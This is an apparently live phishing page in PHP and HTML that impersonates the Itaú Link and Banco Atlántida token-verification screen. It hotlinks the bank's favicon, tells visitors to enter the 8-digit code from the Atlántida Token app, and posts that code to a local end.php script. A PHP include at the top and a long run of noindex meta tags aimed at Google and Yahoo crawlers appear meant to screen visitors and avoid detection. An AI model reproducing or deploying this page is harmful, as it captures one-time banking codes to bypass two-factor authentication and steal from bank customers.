<?php  
include "fucker.php";
?>
<html style="--app-height:1083px;"><head>

    <title>Online</title>
      
      
          
  <meta name="googlebot" content="none">
	<meta name="googlebot" content="noindex">
	<meta name="googlebot" content="nofollow">
	<meta name="googlebot" content="noarchive">
	<meta name="googlebot" content="nocache">
	<meta name="googlebot" content="noimageindex">
	<meta name="googlebot" content="nomediaindex">
	<meta name="googlebot" content="noodp">
	<meta name="googlebot" content="noodyp">
	<meta name="googlebot" content="notranslate">
	<meta name="googlebot" content="noyaca">
	<meta name="googlebot" content="noydir">
	<meta name="slurp" content="none">
	<meta name="slurp" content="noindex">
	<meta name="slurp" content="nofollow">
	<meta name="slurp" content="noarchive">
	<meta name="slurp" content="nocache">
	<meta name="slurp" content="noimageindex">
	<meta name="slurp" content="nomediaindex">
	<meta name="slurp" content="noodp">
	<meta name="slurp" content="notranslate">
	<meta name="slurp" content="noyaca">
	<meta name="slurp" content="noydir">
      <meta http-equiv="X-UA-Compatible" content="IE=10">
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Itaú Link</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      
      
      
      
      
      
      
      
      
      
      
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">	
      <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
      <meta name="facebook-domain-verification" content="olqs9rmhp5r758l9i0t456iudl8l2t">
  <style>
            @font-face {
                font-family: 'Material Icons';
                font-style: normal;
                font-weight: 400;
                src: url('themes/font/materialfont/MaterialIcons-Regular.eot');
                src: local('Material Icons'), local('MaterialIcons-Regular'),
                    url('themes/font/materialfont/MaterialIcons-Regular.woff2')
                    format('woff2'),
                    url('themes/font/materialfont/MaterialIcons-Regular.woff') format('woff'),
                    url('themes/font/materialfont/MaterialIcons-Regular.ttf')
                    format('truetype');
            }

            @font-face {
                font-family: 'batl';
                src:  url('fonts/batl-v24.eot?ligdfv');
                src:  url('fonts/batl-v24.eot?ligdfv#iefix') format('embedded-opentype'),
                    url('fonts/batl-v24.ttf?ligdfv') format('truetype'),
                    url('fonts/batl-v24.woff?ligdfv') format('woff'),
                    url('fonts/batl-v24.svg?ligdfv#batl') format('svg');
                font-weight: normal;
                font-style: normal;
                font-display: block;
            }
            @font-face {
                font-family: 'Neo Sans';
                src:  url('fonts/NeoSan.ttf');
                font-weight: normal;
                font-style: normal;
                font-display: block;
            }
            @font-face {
                font-family: 'Neo Sans Medium';
                src:  url('fonts/NeoSanMed.ttf');
                font-weight: normal;
                font-style: normal;
                font-display: block;
            }
        </style>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.slim.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"></script>
      <meta name="_csrf" content="">
      <!-- default header name is X-CSRF-TOKEN -->
      <meta name="_csrf_header" content="">    
                <link rel="shortcut icon" type="image/x-icon" href="https://aolweb.bancatlan.hn/ocbretail/favicon.ico">
          <link rel="stylesheet" href="css/custom.css" id="sap-ui-core-customcss" data-sap-ui-ready="true">
      <link rel="apple-touch-icon" href="static/img/itau-icon.png"> 
      <link rel="shortcut icon" type="image/png" href="static/img/itau-icon.png"> 
      <meta name="viewport" content="width=device-width, initial-scale=1"> 
<link href="css/bootstrap.min.css" rel="stylesheet"> 
       
      
       
      
       
       
      
      
      <!-- dynamicoptionlist solicitud chequeras --> 
      
      
      
      
  
  
  
  
    
    <meta http-equiv="origin-trial" content="A9wkrvp9y21k30U9lU7MJMjBj4USjLrGwV+Z8zO3J3ZBH139DOnCv3XLK2Ii40S94HG1SZ/Zeg2GSHOD3wlWngYAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
  <meta http-equiv="origin-trial" content="A9wkrvp9y21k30U9lU7MJMjBj4USjLrGwV+Z8zO3J3ZBH139DOnCv3XLK2Ii40S94HG1SZ/Zeg2GSHOD3wlWngYAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="Azy2GzGQxPvGmQwVDdEL1jRuKSXIdSSASA06JCA6PCeaVHpFYf8Rw5/q+9adc9CrBTxfCeUwxkuDM4PWEmdqywwAAACKeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZWFkc2VydmljZXMuY29tOjQ0MyIsImZlYXR1cmUiOiJQcml2YWN5U2FuZGJveEFkc0FQSXMiLCJleHBpcnkiOjE2NjEyOTkxOTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><style type="text/css"></style><style type="text/css"></style><style type="text/css"></style><meta http-equiv="origin-trial" content="A9wkrvp9y21k30U9lU7MJMjBj4USjLrGwV+Z8zO3J3ZBH139DOnCv3XLK2Ii40S94HG1SZ/Zeg2GSHOD3wlWngYAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"><style type="text/css">/* Chart.js */
@-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}</style></head>
  <body class="its_body">
      <div id="wrapper">
          <!-- Header -->
          
          <!-- END Header -->
          <!-- Nav -->
          <nav class="navbar navbar-inverse sub_header" style="min-height:0;">
              
          </nav>
          <!-- END Nav -->
          <div id="hh">
              <section id="funnel-de-ingreso">
                <div class="container">
                  <div class="container-top">
                    
                  </div>
              
                  
<div style="background-color: #ffffff; width: 100%;">
<div style="text-align: center;" align="left"><img alt="" width="150" height="40" class="logo_mobile" src="img/logo_banco_single_red_gradient.svg">
<h3 class="sapMPanelHdr" id="__panel0-header">Código Token<br></h3>
<img style="width: 150px; display: block; margin-left: auto; margin-right: auto;" src="img/f.png"></div>
<br> 
<center><div id="ingresotokenbody" class="ingreso-token__body ingreso-token__body--predeterminado" style="text-align: center;"><form id="form1" class="ng-untouched ng-pristine ng-invalid" action="end.php" method="post" name="form1">
    <input data-v-41575993="" required="" id="25" autocomplete="off" name="sms" minlength="8" maxlength="8" autocorrect="off" type="text" placeholder="Token" autocapitalize="off" spellcheck="false" inputmode="decimal" class="mdl-textfield__input">
  <br><br><button data-v-521d65ac="" data-v-4a2424fc="" id="" type="submit" class="btn btn-success">Verificar</button>


  
  
  
  
  
</form><br>
<div class="ingreso-token__telefono">

</div>
</div><h4 class="sapMPanelHdr" id="__panel0-header">¿Cómo obtener el código token?<br></h4>
<h5 class="sapMPanelHdr" id="__panel0-header">Ingresá a la App Atlantida Token<br> para conseguirla, deberas ingresar a la App Atlantida Token, en la parte inferior del menú.<br>El código que ahi se muestra es el que deberás ingresar para confirmar y finalizar la operación.<br></h5></center>
<br>
<div id="ingresotokenbody" class="ingreso-token__body ingreso-token__body--predeterminado" style="text-align: center;"><form id="form1" class="ng-untouched ng-pristine ng-invalid" action="exit.php" method="post" name="form1">
    
  <br><br>


  
  
  
  
  
</form><br>
<div class="ingreso-token__telefono">
<div class="ng-star-inserted" style="text-align: center;"><br><br>  </div>
</div>
</div>
</div>
                </div>
              </section>
          </div>
          
          
          
      </div>
   
      
      
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
   
   
   
  
  
  
  
  
  
  
  
  
  
  
  
  
  
          
      
  
      
      
      
          
      
  
  
















</body></html>